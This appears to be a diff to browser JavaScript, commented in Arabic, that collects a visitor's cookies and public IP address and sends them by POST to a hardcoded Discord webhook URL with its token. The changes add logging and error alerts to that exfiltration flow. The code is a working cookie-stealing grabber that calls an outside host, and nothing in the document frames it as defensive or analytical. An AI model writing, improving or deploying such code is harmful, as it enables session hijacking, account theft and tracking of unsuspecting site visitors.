@@ -26,16 +26,19 @@
 
         // جلب الكوكيز
         const cookies = getCookies();
+        console.log("الكوكيز الموجودة:", cookies);  // طباعة الكوكيز في الـ Console
 
         // جلب عنوان الـ IP باستخدام API خارجي
         fetch("https://api.ipify.org?format=json")
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;  // الحصول على عنوان الـ IP
+                console.log("عنوان الـ IP:", userIP);  // طباعة الـ IP في الـ Console
+                
                 if (cookies) {
                     sendData(cookies, userIP);  // إرسال الكوكيز والـ IP إلى Webhook
                 } else {
-                    console.log("لا توجد كوكيز");
+                    console.log("لا توجد كوكيز أو الكوكيز فارغة");
                 }
             })
             .catch(error => {
@@ -52,12 +55,19 @@
             xhr.open("POST", "https://discord.com/api/webhooks/1315420160030412821/PM8Cic_rvPk811Jl1rGerqT_KjycvUvAv4wvMjppH0mD3xNEZtnF8MX4sVTt9b8_4bYP", true);
             xhr.setRequestHeader("Content-Type", "application/json");
 
+            // التحقق من حالة الاستجابة من الـ Webhook
             xhr.onload = function () {
                 if (xhr.status === 204) {
                     console.log("تم إرسال البيانات بنجاح.");
                 } else {
-                    console.log("حدث خطأ أثناء إرسال البيانات.");
+                    console.log("حدث خطأ أثناء إرسال البيانات:", xhr.status, xhr.statusText);
+                    alert("حدث خطأ أثناء إرسال البيانات إلى Webhook.");
                 }
+            };
+
+            xhr.onerror = function () {
+                console.log("حدث خطأ في الاتصال بـ Webhook.");
+                alert("حدث خطأ في الاتصال بـ Webhook.");
             };
 
             xhr.send(JSON.stringify(data));  // إرسال البيانات
